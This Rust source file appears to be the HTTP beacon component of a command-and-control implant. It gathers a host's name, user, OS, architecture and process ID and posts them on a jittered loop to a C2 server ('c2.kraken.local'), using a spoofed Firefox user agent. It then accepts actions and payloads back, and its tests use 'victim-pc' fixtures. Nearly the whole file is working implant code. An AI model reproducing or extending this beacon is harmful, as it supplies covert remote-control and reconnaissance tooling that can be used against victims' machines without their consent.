use std::time::Duration;
use rand::RngExt;

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct BeaconConfig {
    pub server_url: String,
    pub interval_secs: u64,
    pub jitter_pct: f64,
    pub user_agent: String,
    pub proxy: Option<String>,
    pub timeout_secs: u64,
}

impl Default for BeaconConfig {
    fn default() -> Self {
        BeaconConfig {
            server_url: "https://c2.kraken.local/beacon".to_string(),
            interval_secs: 60,
            jitter_pct: 0.2,
            user_agent: "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0".to_string(),
            proxy: None,
            timeout_secs: 30,
        }
    }
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct BeaconData {
    pub agent_id: String,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: String,
    pub pid: u32,
    pub uptime_secs: u64,
    pub external_ip: Option<String>,
    pub tags: Vec<String>,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct BeaconResponse {
    pub action: String,
    pub task_id: Option<String>,
    pub payload: Option<String>,
    pub delay: Option<u64>,
}

pub struct HttpBeacon {
    config: BeaconConfig,
    client: reqwest::Client,
    agent_id: String,
}

impl HttpBeacon {
    pub fn new(config: BeaconConfig) -> Self {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(config.timeout_secs))
            .user_agent(&config.user_agent)
            .build()
            .unwrap_or_default();

        HttpBeacon {
            agent_id: uuid::Uuid::new_v4().to_string(),
            config,
            client,
        }
    }

    pub fn with_agent_id(mut self, agent_id: &str) -> Self {
        self.agent_id = agent_id.to_string();
        self
    }

    fn jitter_delay(&self) -> Duration {
        let base = self.config.interval_secs as f64;
        let jitter = base * self.config.jitter_pct * rand::rng().random::<f64>();
        let total = base + jitter - (self.config.jitter_pct * base / 2.0);
        Duration::from_secs_f64(total.max(1.0))
    }

    pub async fn send_beacon(&self, data: &BeaconData) -> Result<BeaconResponse, crate::C2Error> {
        let resp = self.client
            .post(&self.config.server_url)
            .json(data)
            .send()
            .await
            .map_err(|e| crate::C2Error::Transport(format!("beacon send failed: {}", e)))?;

        let br: BeaconResponse = resp
            .json()
            .await
            .map_err(|e| crate::C2Error::Transport(format!("beacon parse failed: {}", e)))?;

        Ok(br)
    }

    pub async fn beacon_loop(&self, data: &BeaconData, mut cancel: tokio::sync::watch::Receiver<bool>) {
        let mut interval = tokio::time::interval(self.jitter_delay());
        loop {
            tokio::select! {
                _ = interval.tick() => {
                    match self.send_beacon(data).await {
                        Ok(response) => {
                            log::info!("C2 beacon: action={}", response.action);
                            if let Some(delay) = response.delay {
                                if delay > 0 {
                                    tokio::time::sleep(Duration::from_secs(delay)).await;
                                }
                            }
                        }
                        Err(e) => {
                            log::warn!("C2 beacon failed: {}", e);
                        }
                    }
                    interval = tokio::time::interval(self.jitter_delay());
                }
                _ = cancel.changed() => {
                    if *cancel.borrow() {
                        log::info!("C2 beacon loop cancelled");
                        break;
                    }
                }
            }
        }
    }

    pub fn agent_id(&self) -> &str {
        &self.agent_id
    }

    pub fn build_beacon_data() -> BeaconData {
        let hostname = std::env::var("HOSTNAME").unwrap_or_else(|_| "unknown".to_string());
        let username = std::env::var("USER").unwrap_or_else(|_| "unknown".to_string());
        let os = std::env::consts::OS.to_string();
        let arch = std::env::consts::ARCH.to_string();
        BeaconData {
            agent_id: String::new(),
            hostname,
            username,
            os,
            arch,
            pid: std::process::id(),
            uptime_secs: 0,
            external_ip: None,
            tags: Vec::new(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_default_config() {
        let config = BeaconConfig::default();
        assert_eq!(config.interval_secs, 60);
        assert!((config.jitter_pct - 0.2).abs() < 1e-6);
    }

    #[test]
    fn test_beacon_data_serialization() {
        let data = BeaconData {
            agent_id: "test-123".to_string(),
            hostname: "victim-pc".to_string(),
            username: "admin".to_string(),
            os: "linux".to_string(),
            arch: "x86_64".to_string(),
            pid: 1337,
            uptime_secs: 3600,
            external_ip: Some("1.2.3.4".to_string()),
            tags: vec!["dmz".to_string()],
        };
        let json = serde_json::to_string_pretty(&data).unwrap();
        assert!(json.contains("victim-pc"));
        assert!(json.contains("1.2.3.4"));
    }

    #[test]
    fn test_beacon_response() {
        let resp = BeaconResponse {
            action: "sleep".to_string(),
            task_id: None,
            payload: None,
            delay: Some(300),
        };
        assert_eq!(resp.action, "sleep");
        assert_eq!(resp.delay, Some(300));
    }

    #[test]
    fn test_build_beacon_data() {
        let data = HttpBeacon::build_beacon_data();
        assert!(!data.hostname.is_empty());
        assert_eq!(data.pid, std::process::id());
    }

    #[test]
    fn test_new_beacon_with_agent_id() {
        let config = BeaconConfig::default();
        let beacon = HttpBeacon::new(config).with_agent_id("custom-agent");
        assert_eq!(beacon.agent_id(), "custom-agent");
    }

    #[test]
    fn test_jitter_delay_range() {
        let config = BeaconConfig::default();
        let beacon = HttpBeacon::new(config);
        for _ in 0..100 {
            let d = beacon.jitter_delay();
            let secs = d.as_secs_f64();
            assert!(secs >= 1.0, "jitter too low: {}", secs);
            assert!(secs <= 72.0, "jitter too high: {}", secs);
        }
    }

    #[test]
    fn test_beacon_config_serialization() {
        let config = BeaconConfig::default();
        let json = serde_json::to_string_pretty(&config).unwrap();
        assert!(json.contains("server_url"));
        assert!(json.contains("jitter_pct"));
    }
}
